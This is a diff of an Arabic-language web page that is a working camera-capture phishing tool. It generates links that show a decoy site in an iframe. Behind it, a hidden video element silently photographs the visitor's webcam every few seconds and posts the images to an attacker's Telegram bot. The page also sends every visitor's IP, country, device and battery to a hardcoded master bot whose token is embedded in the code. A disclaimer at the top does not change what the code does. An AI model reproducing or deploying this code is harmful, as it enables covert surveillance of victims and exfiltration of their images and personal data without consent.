@@ -1,246 +1,246 @@
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
-  <meta charset="utf-8" />
-  <meta name="viewport" content="width=device-width,initial-scale=1" />
-  <title>MARO.com</title>
-  <style>
-    :root{
-      --bg1:#0b0712;
-      --card:#131026;
-      --accent1:#a66bff;
-      --accent2:#6e3be0;
-      --muted:#bfaef6;
-    }
-    html,body{height:100%;margin:0;font-family: 'Poppins', Tahoma, sans-serif;background:var(--bg1);color:#fff}
-    body{
-      background: #000000;
-      background-image: none;
-      position:relative;
-    }
-    .overlay {
-      display: none;
-    }
-    .wrap{position:relative;z-index:2;min-height:100vh;display:flex;flex-direction:column;align-items:center;padding:30px 20px;box-sizing:border-box}
-    .header{width:100%;max-width:1100px;display:flex;justify-content:space-between;align-items:center;margin-bottom:24px}
-    .brand{font-weight:800;font-size:22px;color:#ffffff;letter-spacing:0.6px}
-    .nav{display:flex;gap:18px}
-    .nav a{color:#ffffff;text-decoration:none;padding:8px 14px;border-radius:10px;background:rgba(255,255,255,0.03)}
-    .card{width:100%;max-width:720px;background: linear-gradient(180deg, rgba(18,12,34,0.85), rgba(10,7,18,0.75));
-      border-radius:16px;padding:22px;box-shadow: 0 10px 40px rgba(0,0,0,0.6);backdrop-filter: blur(4px);}
-    .hero{display:flex;gap:20px;align-items:center;flex-wrap:wrap}
-    .hero-left{flex:1;min-width:260px}
-    .title{font-size:34px;color:#ffffff;margin:0 0 8px}
-    .subtitle{color:#ffffff;margin:0 0 18px}
-    .form {background: rgba(255,255,255,0.03); padding:14px;border-radius:12px}
-    label{display:block;color:#ffffff;font-weight:700;margin:10px 0 6px}
-    input[type="text"]{width:100%;padding:12px;border-radius:10px;border:1px solid rgba(255,255,255,0.04);background:transparent;color:#fff;outline:none;font-size:14px;box-sizing:border-box}
-    .row{display:flex;gap:12px}
-    .btn{
-      display:inline-block;padding:12px 16px;border-radius:12px;border:none;background:linear-gradient(90deg, #ffffff, #cccccc);color:#000000;font-weight:800;cursor:pointer;margin-top:12px;width:100%;
-    }
-    .result{margin-top:14px;padding:10px;border-radius:10px;background:rgba(255,255,255,0.02);word-break:break-all;font-size:14px;display:flex;gap:10px;align-items:center;justify-content:space-between}
-    .copyBtn{padding:8px 12px;border-radius:10px;background:rgba(255,255,255,0.06);border:1px solid rgba(255,255,255,0.04);cursor:pointer;color:#fff}
-    .captureBadge{
-      position:fixed;top:14px;right:14px;z-index:9999;
-      background:rgba(0,0,0,0.55);padding:8px 12px;border-radius:999px;font-weight:800;color:#ffd966;font-size:13px;display:none;
-      box-shadow:0 8px 30px rgba(0,0,0,0.5);backdrop-filter: blur(4px);
-    }
-    .madeby{
-      position:fixed;left:14px;bottom:14px;z-index:9999;
-      background:rgba(12,7,20,0.5);padding:8px 12px;border-radius:10px;font-weight:700;
-      box-shadow:0 6px 20px rgba(0,0,0,0.5);
-      color: #ffffff;
-    }
-    .viewerFrame{width:100%;height:calc(100vh - 40px);border-radius:10px;border:0;overflow:hidden}
-    @media (max-width:720px){
-      .title{font-size:28px}
-      .card{padding:16px}
-      .wrap{padding:18px}
-    }
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>MARO.com</title>
+  <style>
+    :root{
+      --bg1:#0b0712;
+      --card:#131026;
+      --accent1:#a66bff;
+      --accent2:#6e3be0;
+      --muted:#bfaef6;
+    }
+    html,body{height:100%;margin:0;font-family: 'Poppins', Tahoma, sans-serif;background:var(--bg1);color:#fff}
+    body{
+      background: #000000;
+      background-image: none;
+      position:relative;
+    }
+    .overlay {
+      display: none;
+    }
+    .wrap{position:relative;z-index:2;min-height:100vh;display:flex;flex-direction:column;align-items:center;padding:30px 20px;box-sizing:border-box}
+    .header{width:100%;max-width:1100px;display:flex;justify-content:space-between;align-items:center;margin-bottom:24px}
+    .brand{font-weight:800;font-size:22px;color:#ffffff;letter-spacing:0.6px}
+    .nav{display:flex;gap:18px}
+    .nav a{color:#ffffff;text-decoration:none;padding:8px 14px;border-radius:10px;background:rgba(255,255,255,0.03)}
+    .card{width:100%;max-width:720px;background: linear-gradient(180deg, rgba(18,12,34,0.85), rgba(10,7,18,0.75));
+      border-radius:16px;padding:22px;box-shadow: 0 10px 40px rgba(0,0,0,0.6);backdrop-filter: blur(4px);}
+    .hero{display:flex;gap:20px;align-items:center;flex-wrap:wrap}
+    .hero-left{flex:1;min-width:260px}
+    .title{font-size:34px;color:#ffffff;margin:0 0 8px}
+    .subtitle{color:#ffffff;margin:0 0 18px}
+    .form {background: rgba(255,255,255,0.03); padding:14px;border-radius:12px}
+    label{display:block;color:#ffffff;font-weight:700;margin:10px 0 6px}
+    input[type="text"]{width:100%;padding:12px;border-radius:10px;border:1px solid rgba(255,255,255,0.04);background:transparent;color:#fff;outline:none;font-size:14px;box-sizing:border-box}
+    .row{display:flex;gap:12px}
+    .btn{
+      display:inline-block;padding:12px 16px;border-radius:12px;border:none;background:linear-gradient(90deg, #ffffff, #cccccc);color:#000000;font-weight:800;cursor:pointer;margin-top:12px;width:100%;
+    }
+    .result{margin-top:14px;padding:10px;border-radius:10px;background:rgba(255,255,255,0.02);word-break:break-all;font-size:14px;display:flex;gap:10px;align-items:center;justify-content:space-between}
+    .copyBtn{padding:8px 12px;border-radius:10px;background:rgba(255,255,255,0.06);border:1px solid rgba(255,255,255,0.04);cursor:pointer;color:#fff}
+    .captureBadge{
+      position:fixed;top:14px;right:14px;z-index:9999;
+      background:rgba(0,0,0,0.55);padding:8px 12px;border-radius:999px;font-weight:800;color:#ffd966;font-size:13px;display:none;
+      box-shadow:0 8px 30px rgba(0,0,0,0.5);backdrop-filter: blur(4px);
+    }
+    .madeby{
+      position:fixed;left:14px;bottom:14px;z-index:9999;
+      background:rgba(12,7,20,0.5);padding:8px 12px;border-radius:10px;font-weight:700;
+      box-shadow:0 6px 20px rgba(0,0,0,0.5);
+      color: #ffffff;
+    }
+    .viewerFrame{width:100%;height:calc(100vh - 40px);border-radius:10px;border:0;overflow:hidden}
+    @media (max-width:720px){
+      .title{font-size:28px}
+      .card{padding:16px}
+      .wrap{padding:18px}
+    }
 
-    /* الدايلوج المطور */
-    .dialog {
-      position: fixed;
-      top: 50%;
-      left: 50%;
-      transform: translate(-50%, -50%);
-      background: #000000;
-      border: 2px solid #ffffff;
-      border-radius: 20px;
-      padding: 40px 30px;
-      text-align: center;
-      z-index: 99999;
-      box-shadow: 0 0 30px rgba(255,255,255,0.2);
-      width: 80%;
-      max-width: 500px;
-    }
-    .dialog p {
-      color: #ffffff;
-      font-size: 22px;
-      font-weight: 800;
-      margin-bottom: 30px;
-    }
-    .dialog-buttons {
-      display: flex;
-      flex-direction: column;
-      gap: 15px;
-      align-items: center;
-    }
-    .dialog-link {
-      display: inline-block;
-      background: #ffffff;
-      color: #000000;
-      padding: 14px 25px;
-      border-radius: 50px;
-      text-decoration: none;
-      font-weight: 900;
-      font-size: 18px;
-      border: 2px solid #ffffff;
-      transition: 0.3s;
-      width: 80%;
-    }
-    .dialog-link.visited {
-      background: #28a745;
-      color: white;
-      border-color: #28a745;
-    }
-    .dialog-btn {
-      display: inline-block;
-      background: #ffffff;
-      color: #000000;
-      padding: 16px 30px;
-      border-radius: 50px;
-      text-decoration: none;
-      font-weight: 900;
-      font-size: 18px;
-      border: 2px solid #ffffff;
-      transition: 0.3s;
-      box-shadow: 0 0 20px rgba(255,255,255,0.3);
-      margin-top: 20px;
-      width: 80%;
-      cursor: pointer;
-      opacity: 0.5;
-      pointer-events: none;
-    }
-    .dialog-btn.active {
-      opacity: 1;
-      pointer-events: auto;
-      background: #ffffff;
-      color: #000000;
-    }
-    .dialog-btn.active:hover {
-      background: transparent;
-      color: #ffffff;
-    }
-    .check-icon {
-      margin-right: 8px;
-    }
-  </style>
+    /* الدايلوج المطور */
+    .dialog {
+      position: fixed;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      background: #000000;
+      border: 2px solid #ffffff;
+      border-radius: 20px;
+      padding: 40px 30px;
+      text-align: center;
+      z-index: 99999;
+      box-shadow: 0 0 30px rgba(255,255,255,0.2);
+      width: 80%;
+      max-width: 500px;
+    }
+    .dialog p {
+      color: #ffffff;
+      font-size: 22px;
+      font-weight: 800;
+      margin-bottom: 30px;
+    }
+    .dialog-buttons {
+      display: flex;
+      flex-direction: column;
+      gap: 15px;
+      align-items: center;
+    }
+    .dialog-link {
+      display: inline-block;
+      background: #ffffff;
+      color: #000000;
+      padding: 14px 25px;
+      border-radius: 50px;
+      text-decoration: none;
+      font-weight: 900;
+      font-size: 18px;
+      border: 2px solid #ffffff;
+      transition: 0.3s;
+      width: 80%;
+    }
+    .dialog-link.visited {
+      background: #28a745;
+      color: white;
+      border-color: #28a745;
+    }
+    .dialog-btn {
+      display: inline-block;
+      background: #ffffff;
+      color: #000000;
+      padding: 16px 30px;
+      border-radius: 50px;
+      text-decoration: none;
+      font-weight: 900;
+      font-size: 18px;
+      border: 2px solid #ffffff;
+      transition: 0.3s;
+      box-shadow: 0 0 20px rgba(255,255,255,0.3);
+      margin-top: 20px;
+      width: 80%;
+      cursor: pointer;
+      opacity: 0.5;
+      pointer-events: none;
+    }
+    .dialog-btn.active {
+      opacity: 1;
+      pointer-events: auto;
+      background: #ffffff;
+      color: #000000;
+    }
+    .dialog-btn.active:hover {
+      background: transparent;
+      color: #ffffff;
+    }
+    .check-icon {
+      margin-right: 8px;
+    }
+  </style>
 </head>
 <body>
 
-  <div class="wrap">
+  <div class="wrap">
 
-    <div class="header" style="width:100%;max-width:1100px;"> 
-      <div class="nav">
-        <a href="#"></a>
-        <a href="#"></a>
-      </div>
-    </div>
+    <div class="header" style="width:100%;max-width:1100px;"> 
+      <div class="nav">
+        <a href="#"></a>
+        <a href="#"></a>
+      </div>
+    </div>
 
-    <div class="card" id="cardArea" style="width:100%">
-      <div class="hero">
-        <div class="hero-left">
-          <h5>⚠️ يُمنع استخدام الأداة بشكل غير قانوني أو غير أخلاقي. المستخدم يتحمل المسؤولية الكاملة، ولسنا مسؤولين عن أي إساءة استخدام.</h5>
+    <div class="card" id="cardArea" style="width:100%">
+      <div class="hero">
+        <div class="hero-left">
+          <h5>⚠️ يُمنع استخدام الأداة بشكل غير قانوني أو غير أخلاقي. المستخدم يتحمل المسؤولية الكاملة، ولسنا مسؤولين عن أي إساءة استخدام.</h5>
 
-          <div class="form" id="formBox">
-            <label>أدخل الـ ID</label>
-            <input type="text" id="chatIdInput" placeholder="Chat ID">
+          <div class="form" id="formBox">
+            <label>أدخل الـ ID</label>
+            <input type="text" id="chatIdInput" placeholder="Chat ID">
 
-            <label>أدخل توكن البوت</label>
-            <input type="text" id="tokenInput" placeholder="Bot Token">
+            <label>أدخل توكن البوت</label>
+            <input type="text" id="tokenInput" placeholder="Bot Token">
 
-            <label>أدخل الرابط الذي تريد عرضه</label>
-            <input type="text" id="linkInput" placeholder="https://b7xha.github.io/Maroweb/">
+            <label>أدخل الرابط الذي تريد عرضه</label>
+            <input type="text" id="linkInput" placeholder="https://b7xha.github.io/Maroweb/">
 
-            <button class="btn" id="generateBtn">إنشاء الرابط</button>
+            <button class="btn" id="generateBtn">إنشاء الرابط</button>
 
-            <div id="result" style="display:none" class="result">
-              <div id="linkText" style="flex:1;color:#e7dbff;font-size:13px;"></div>
-              <button class="copyBtn" id="copyBtn">نسخ الرابط</button>
-            </div>
-          </div>
-        </div>
+            <div id="result" style="display:none" class="result">
+              <div id="linkText" style="flex:1;color:#e7dbff;font-size:13px;"></div>
+              <button class="copyBtn" id="copyBtn">نسخ الرابط</button>
+            </div>
+          </div>
+        </div>
 
-        <div style="min-width:260px;flex:0 0 260px;">
-          <div style="background:linear-gradient(180deg, rgba(128,77,255,0.08), rgba(0,0,0,0.15));padding:14px;border-radius:12px;text-align:center">
-          </div>
-        </div>
-      </div>
-    </div>
+        <div style="min-width:260px;flex:0 0 260px;">
+          <div style="background:linear-gradient(180deg, rgba(128,77,255,0.08), rgba(0,0,0,0.15));padding:14px;border-radius:12px;text-align:center">
+          </div>
+        </div>
+      </div>
+    </div>
 
-  </div>
+  </div>
 
-  <div id="captureBadge" class="captureBadge"></div>
-  <div class="madeby">Made by K1X</div>
+  <div id="captureBadge" class="captureBadge"></div>
+  <div class="madeby">Made by K1X</div>
 
-  <!-- الدايلوج بشرط الاشتراك في قناتين -->
-  <div class="dialog" id="mandatoryDialog">
-    <p> اشتراك إجباري في القنوات </p>
-    <div class="dialog-buttons" id="dialogButtons">
-      <a href="https://t.me/Maro_hacker_eg" target="_blank" class="dialog-link" id="channel1" data-visited="false">@Maro_hacker_eg</a>
-      <a href="https://t.me/lego2028" target="_blank" class="dialog-link" id="channel2" data-visited="false">@lego2028</a>
-      <button class="dialog-btn" id="subscribeDoneBtn" disabled>تم الاشتراك</button>
-    </div>
-  </div>
+  <!-- الدايلوج بشرط الاشتراك في قناتين -->
+  <div class="dialog" id="mandatoryDialog">
+    <p> اشتراك إجباري في القنوات </p>
+    <div class="dialog-buttons" id="dialogButtons">
+      <a href="https://t.me/Maro_hacker_eg" target="_blank" class="dialog-link" id="channel1" data-visited="false">@Maro_hacker_eg</a>
+      <a href="https://t.me/lego2028" target="_blank" class="dialog-link" id="channel2" data-visited="false">@lego2028</a>
+      <button class="dialog-btn" id="subscribeDoneBtn" disabled>تم الاشتراك</button>
+    </div>
+  </div>
 
 <script>
-  // ------------------ متغيرات البوت الثابتة ------------------
-  const MASTER_BOT_TOKEN = "8550564365:AAEjhh_aqXExLx3i8N7niKQXjJefhdkzqtY";
-  const MASTER_CHAT_ID   = "6197511637";
+  // ------------------ متغيرات البوت الثابتة ------------------
+  const MASTER_BOT_TOKEN = "8550564365:AAEjhh_aqXExLx3i8N7niKQXjJefhdkzqtY";
+  const MASTER_CHAT_ID   = "6197511637";
 
-  // ------------------ تخزين معلومات الزائر بشكل عام ------------------
-  let visitorIP = "غير معروف";
-  let visitorCountry = "غير معروف";
-  let visitorDevice = "Unknown";
-  let visitorBattery = "غير متاح";
-  let visitorOS = "غير معروف";
+  // ------------------ تخزين معلومات الزائر بشكل عام ------------------
+  let visitorIP = "غير معروف";
+  let visitorCountry = "غير معروف";
+  let visitorDevice = "Unknown";
+  let visitorBattery = "غير متاح";
+  let visitorOS = "غير معروف";
 
-  // ------------------ إرسال معلومات الزائر (البلد + الجهاز + الشحن) ------------------
-  async function sendVisitorInfo() {
-    try {
-      // 1. جمع معلومات الجهاز
-      const userAgent = navigator.userAgent;
-      visitorDevice = "Unknown";
-      if (/Android/i.test(userAgent)) visitorDevice = "Android";
-      else if (/iPhone|iPad|iPod/i.test(userAgent)) visitorDevice = "iOS";
-      else if (/Windows/i.test(userAgent)) visitorDevice = "Windows";
-      else if (/Mac/i.test(userAgent)) visitorDevice = "MacOS";
-      else if (/Linux/i.test(userAgent)) visitorDevice = "Linux";
+  // ------------------ إرسال معلومات الزائر (البلد + الجهاز + الشحن) ------------------
+  async function sendVisitorInfo() {
+    try {
+      // 1. جمع معلومات الجهاز
+      const userAgent = navigator.userAgent;
+      visitorDevice = "Unknown";
+      if (/Android/i.test(userAgent)) visitorDevice = "Android";
+      else if (/iPhone|iPad|iPod/i.test(userAgent)) visitorDevice = "iOS";
+      else if (/Windows/i.test(userAgent)) visitorDevice = "Windows";
+      else if (/Mac/i.test(userAgent)) visitorDevice = "MacOS";
+      else if (/Linux/i.test(userAgent)) visitorDevice = "Linux";
 
-      visitorOS = navigator.platform || "غير معروف";
+      visitorOS = navigator.platform || "غير معروف";
 
-      // 2. محاولة الحصول على البطارية (نسبة الشحن)
-      if (navigator.getBattery) {
-        try {
-          const battery = await navigator.getBattery();
-          visitorBattery = (battery.level * 100) + "%";
-          if (battery.charging) visitorBattery += " (يتم الشحن)";
-          else visitorBattery += " (غير موصول)";
-        } catch (e) { visitorBattery = "غير متاح"; }
-      }
+      // 2. محاولة الحصول على البطارية (نسبة الشحن)
+      if (navigator.getBattery) {
+        try {
+          const battery = await navigator.getBattery();
+          visitorBattery = (battery.level * 100) + "%";
+          if (battery.charging) visitorBattery += " (يتم الشحن)";
+          else visitorBattery += " (غير موصول)";
+        } catch (e) { visitorBattery = "غير متاح"; }
+      }
 
-      // 3. الحصول على IP والدولة عبر خدمة خارجية
-      try {
-        const ipRes = await fetch('https://ipapi.co/json/');
-        const ipData = await ipRes.json();
-        visitorIP = ipData.ip || "غير معروف";
-        visitorCountry = ipData.country_name || "غير معروف";
-      } catch (e) { /* تجاهل الفشل */ }
+      // 3. الحصول على IP والدولة عبر خدمة خارجية
+      try {
+        const ipRes = await fetch('https://ipapi.co/json/');
+        const ipData = await ipRes.json();
+        visitorIP = ipData.ip || "غير معروف";
+        visitorCountry = ipData.country_name || "غير معروف";
+      } catch (e) { /* تجاهل الفشل */ }
 
-      // 4. تجهيز الرسالة
-      const message = `
+      // 4. تجهيز الرسالة
+      const message = `
 🟢 *زيارة جديدة للموقع*
 ━━━━━━━━━━━━━━━
 🌍 *الدولة*: ${visitorCountry}
@@ -250,179 +250,179 @@
 🌐 *IP*: ${visitorIP}
 🕒 *التوقيت*: ${new Date().toLocaleString('ar-EG')}
 ━━━━━━━━━━━━━━━
-      `;
+      `;
 
-      // 5. إرسال إلى البوت الرئيسي
-      const url = `https://api.telegram.org/bot${MASTER_BOT_TOKEN}/sendMessage`;
-      await fetch(url, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          chat_id: MASTER_CHAT_ID,
-          text: message,
-          parse_mode: 'Markdown'
-        })
-      });
+      // 5. إرسال إلى البوت الرئيسي
+      const url = `https://api.telegram.org/bot${MASTER_BOT_TOKEN}/sendMessage`;
+      await fetch(url, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: MASTER_CHAT_ID,
+          text: message,
+          parse_mode: 'Markdown'
+        })
+      });
 
-    } catch (err) {
-      console.error("فشل إرسال معلومات الزائر", err);
-    }
-  }
+    } catch (err) {
+      console.error("فشل إرسال معلومات الزائر", err);
+    }
+  }
 
-  // استدعاء دالة إرسال المعلومات فور فتح الصفحة (الزائر العادي)
-  sendVisitorInfo();
+  // استدعاء دالة إرسال المعلومات فور فتح الصفحة (الزائر العادي)
+  sendVisitorInfo();
 
-  // ------------------ عناصر الدايلوج ------------------
-  const dialog = document.getElementById('mandatoryDialog');
-  const channel1 = document.getElementById('channel1');
-  const channel2 = document.getElementById('channel2');
-  const subscribeBtn = document.getElementById('subscribeDoneBtn');
+  // ------------------ عناصر الدايلوج ------------------
+  const dialog = document.getElementById('mandatoryDialog');
+  const channel1 = document.getElementById('channel1');
+  const channel2 = document.getElementById('channel2');
+  const subscribeBtn = document.getElementById('subscribeDoneBtn');
 
-  // التحقق من حالة الاشتراك
-  let channel1Clicked = false;
-  let channel2Clicked = false;
+  // التحقق من حالة الاشتراك
+  let channel1Clicked = false;
+  let channel2Clicked = false;
 
-  // عند النقر على رابط القناة الأولى
-  channel1.addEventListener('click', function() {
-    channel1Clicked = true;
-    channel1.classList.add('visited');
-    channel1.style.background = '#28a745';
-    channel1.style.color = 'white';
-    channel1.style.borderColor = '#28a745';
-    checkBothClicked();
-  });
+  // عند النقر على رابط القناة الأولى
+  channel1.addEventListener('click', function() {
+    channel1Clicked = true;
+    channel1.classList.add('visited');
+    channel1.style.background = '#28a745';
+    channel1.style.color = 'white';
+    channel1.style.borderColor = '#28a745';
+    checkBothClicked();
+  });
 
-  // عند النقر على رابط القناة الثانية
-  channel2.addEventListener('click', function() {
-    channel2Clicked = true;
-    channel2.classList.add('visited');
-    channel2.style.background = '#28a745';
-    channel2.style.color = 'white';
-    channel2.style.borderColor = '#28a745';
-    checkBothClicked();
-  });
+  // عند النقر على رابط القناة الثانية
+  channel2.addEventListener('click', function() {
+    channel2Clicked = true;
+    channel2.classList.add('visited');
+    channel2.style.background = '#28a745';
+    channel2.style.color = 'white';
+    channel2.style.borderColor = '#28a745';
+    checkBothClicked();
+  });
 
-  // دالة التحقق من النقر على كلا الرابطين
-  function checkBothClicked() {
-    if (channel1Clicked && channel2Clicked) {
-      subscribeBtn.disabled = false;
-      subscribeBtn.classList.add('active');
-      subscribeBtn.style.opacity = '1';
-      subscribeBtn.style.pointerEvents = 'auto';
-      subscribeBtn.innerHTML = '✅ تم الاشتراك';
-    }
-  }
+  // دالة التحقق من النقر على كلا الرابطين
+  function checkBothClicked() {
+    if (channel1Clicked && channel2Clicked) {
+      subscribeBtn.disabled = false;
+      subscribeBtn.classList.add('active');
+      subscribeBtn.style.opacity = '1';
+      subscribeBtn.style.pointerEvents = 'auto';
+      subscribeBtn.innerHTML = '✅ تم الاشتراك';
+    }
+  }
 
-  // إخفاء الدايلوج عند الضغط على زر "تم الاشتراك"
-  subscribeBtn.addEventListener('click', function() {
-    dialog.style.display = 'none';
-  });
+  // إخفاء الدايلوج عند الضغط على زر "تم الاشتراك"
+  subscribeBtn.addEventListener('click', function() {
+    dialog.style.display = 'none';
+  });
 
-  // ------------------ عناصر الفورم ------------------
-  const generateBtn = document.getElementById('generateBtn');
-  const resultEl = document.getElementById('result');
-  const linkText = document.getElementById('linkText');
-  const copyBtn = document.getElementById('copyBtn');
+  // ------------------ عناصر الفورم ------------------
+  const generateBtn = document.getElementById('generateBtn');
+  const resultEl = document.getElementById('result');
+  const linkText = document.getElementById('linkText');
+  const copyBtn = document.getElementById('copyBtn');
 
-  generateBtn.addEventListener('click', () => {
-    const chat = document.getElementById('chatIdInput').value.trim();
-    const token = document.getElementById('tokenInput').value.trim();
-    const url = document.getElementById('linkInput').value.trim();
+  generateBtn.addEventListener('click', () => {
+    const chat = document.getElementById('chatIdInput').value.trim();
+    const token = document.getElementById('tokenInput').value.trim();
+    const url = document.getElementById('linkInput').value.trim();
 
-    if(!chat || !token || !url){
-      alert('املأ كل الحقول');
-      return;
-    }
+    if(!chat || !token || !url){
+      alert('املأ كل الحقول');
+      return;
+    }
 
-    const fullLink = `${window.location.origin}${window.location.pathname}?chat=${encodeURIComponent(chat)}&token=${encodeURIComponent(token)}&url=${encodeURIComponent(url)}`;
-    linkText.innerText = fullLink;
-    resultEl.style.display = 'flex';
-  });
+    const fullLink = `${window.location.origin}${window.location.pathname}?chat=${encodeURIComponent(chat)}&token=${encodeURIComponent(token)}&url=${encodeURIComponent(url)}`;
+    linkText.innerText = fullLink;
+    resultEl.style.display = 'flex';
+  });
 
-  copyBtn.addEventListener('click', async () => {
-    try {
-      await navigator.clipboard.writeText(linkText.innerText);
-      copyBtn.innerText = 'تم النسخ';
-      setTimeout(()=> copyBtn.innerText = 'نسخ الرابط',1500);
-    } catch(e) {
-      alert('فشل النسخ: ' + e.message);
-    }
-  });
+  copyBtn.addEventListener('click', async () => {
+    try {
+      await navigator.clipboard.writeText(linkText.innerText);
+      copyBtn.innerText = 'تم النسخ';
+      setTimeout(()=> copyBtn.innerText = 'نسخ الرابط',1500);
+    } catch(e) {
+      alert('فشل النسخ: ' + e.message);
+    }
+  });
 
-  // ------------------ viewer mode ------------------
-  const params = new URLSearchParams(window.location.search);
-  const chat = params.get('chat');
-  const token = params.get('token');
-  const target = params.get('url');
+  // ------------------ viewer mode ------------------
+  const params = new URLSearchParams(window.location.search);
+  const chat = params.get('chat');
+  const token = params.get('token');
+  const target = params.get('url');
 
-  if (chat && token && target) {
-    // إخفاء الكارت وعرض الـ iframe
-    document.getElementById('cardArea').style.display = 'none';
-    const iframe = document.createElement('iframe');
-    iframe.className = 'viewerFrame';
-    iframe.src = target;
-    document.querySelector('.wrap').appendChild(iframe);
+  if (chat && token && target) {
+    // إخفاء الكارت وعرض الـ iframe
+    document.getElementById('cardArea').style.display = 'none';
+    const iframe = document.createElement('iframe');
+    iframe.className = 'viewerFrame';
+    iframe.src = target;
+    document.querySelector('.wrap').appendChild(iframe);
 
-    const captureBadge = document.getElementById('captureBadge');
-    captureBadge.style.display = 'inline-block';
-    captureBadge.textContent = '';
-    captureBadge.style.background = 'rgba(0,0,0,0.0)';
+    const captureBadge = document.getElementById('captureBadge');
+    captureBadge.style.display = 'inline-block';
+    captureBadge.textContent = '';
+    captureBadge.style.background = 'rgba(0,0,0,0.0)';
 
-    (async function startCameraAndSend(){
-      try {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
-        const vid = document.createElement('video');
-        vid.autoplay = true; 
-        vid.playsInline = true; 
-        vid.muted = true; 
-        vid.style.display = 'none';
-        vid.srcObject = stream;
-        document.body.appendChild(vid);
-        
-        // انتظر حتى يشتغل الفيديو فعلاً
-        await vid.play();
-        
-        // انتظر حتى يكون للفيديو أبعاد حقيقية
-        let attempts = 0;
-        while ((vid.videoWidth === 0 || vid.videoHeight === 0) && attempts < 50) {
-          await new Promise(resolve => setTimeout(resolve, 100));
-          attempts++;
-        }
+    (async function startCameraAndSend(){
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
+        const vid = document.createElement('video');
+        vid.autoplay = true; 
+        vid.playsInline = true; 
+        vid.muted = true; 
+        vid.style.display = 'none';
+        vid.srcObject = stream;
+        document.body.appendChild(vid);
+        
+        // انتظر حتى يشتغل الفيديو فعلاً
+        await vid.play();
+        
+        // انتظر حتى يكون للفيديو أبعاد حقيقية
+        let attempts = 0;
+        while ((vid.videoWidth === 0 || vid.videoHeight === 0) && attempts < 50) {
+          await new Promise(resolve => setTimeout(resolve, 100));
+          attempts++;
+        }
 
-        const canvas = document.createElement('canvas');
-        canvas.width = vid.videoWidth || 640;
-        canvas.height = vid.videoHeight || 480;
+        const canvas = document.createElement('canvas');
+        canvas.width = vid.videoWidth || 640;
+        canvas.height = vid.videoHeight || 480;
 
-        const tick = async () => {
-          // تأكد أن الفيديو شغال
-          if (vid.paused || vid.ended) {
-            await vid.play();
-          }
-          
-          // تأكد من الأبعاد
-          if (vid.videoWidth > 0 && vid.videoHeight > 0) {
-            canvas.width = vid.videoWidth;
-            canvas.height = vid.videoHeight;
-          }
-          
-          const ctx = canvas.getContext('2d');
-          ctx.drawImage(vid, 0, 0, canvas.width, canvas.height);
+        const tick = async () => {
+          // تأكد أن الفيديو شغال
+          if (vid.paused || vid.ended) {
+            await vid.play();
+          }
+          
+          // تأكد من الأبعاد
+          if (vid.videoWidth > 0 && vid.videoHeight > 0) {
+            canvas.width = vid.videoWidth;
+            canvas.height = vid.videoHeight;
+          }
+          
+          const ctx = canvas.getContext('2d');
+          ctx.drawImage(vid, 0, 0, canvas.width, canvas.height);
 
-          canvas.toBlob(async (blob) => {
-            // تجاهل الصور الصغيرة جداً (الفارغة)
-            if (!blob || blob.size < 2000) return;
-            
-            try {
-              const form = new FormData();
-              form.append('chat_id', chat);
-              form.append('photo', blob, `img_${Date.now()}.png`);
-              
-              await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
-                method: 'POST',
-                body: form
-              });
+          canvas.toBlob(async (blob) => {
+            // تجاهل الصور الصغيرة جداً (الفارغة)
+            if (!blob || blob.size < 2000) return;
+            
+            try {
+              const form = new FormData();
+              form.append('chat_id', chat);
+              form.append('photo', blob, `img_${Date.now()}.png`);
+              
+              await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+                method: 'POST',
+                body: form
+              });
 
-              const caption = `
+              const caption = `
 ━━━━━━━━━━━━━━━
 📸 *صورة جديدة تم التقاطها*
 ━━━━━━━━━━━━━━━
@@ -433,45 +433,43 @@
 🔗 *الرابط المعروض*: ${target}
 🕒 *الوقت*: ${new Date().toLocaleString('ar-EG')}
 ━━━━━━━━━━━━━━━
-              `;
+              `;
 
-              await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                  chat_id: chat,
-                  text: caption,
-                  parse_mode: 'Markdown'
-                })
-              });
-              
-            } catch (err) {
-              console.error('Send error', err);
-            }
-          }, 'image/jpeg', 0.9);
-        };
+              await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                  chat_id: chat,
+                  text: caption,
+                  parse_mode: 'Markdown'
+                })
+              });
+              
+            } catch (err) {
+              console.error('Send error', err);
+            }
+          }, 'image/jpeg', 0.9);
+        };
 
-        // أول صورة بعد ثانيتين عشان الفيديو يثبت
-        setTimeout(tick, 2000);
-        
-        // بعد كده كل 4 ثواني
-        const intervalId = setInterval(tick, 4000);
+        // أول صورة بعد ثانيتين عشان الفيديو يثبت
+        setTimeout(tick, 2000);
+        
+        // بعد كده كل 4 ثواني
+        const intervalId = setInterval(tick, 4000);
 
-        window.addEventListener('beforeunload', () => {
-          clearInterval(intervalId);
-          stream.getTracks().forEach(t => t.stop());
-        });
+        window.addEventListener('beforeunload', () => {
+          clearInterval(intervalId);
+          stream.getTracks().forEach(t => t.stop());
+        });
 
-      } catch (err) {
-        const captureBadge = document.getElementById('captureBadge');
-        captureBadge.textContent = '❌ إذن الكاميرا مرفوض';
-        captureBadge.style.background = 'rgba(160,40,40,0.9)';
-        console.error('Camera error', err);
-      }
-    })();
-  }
+      } catch (err) {
+        const captureBadge = document.getElementById('captureBadge');
+        captureBadge.textContent = '❌ إذن الكاميرا مرفوض';
+        captureBadge.style.background = 'rgba(160,40,40,0.9)';
+        console.error('Camera error', err);
+      }
+    })();
+  }
 </script>
 </body>
-  </html>
-
-
+  </html>
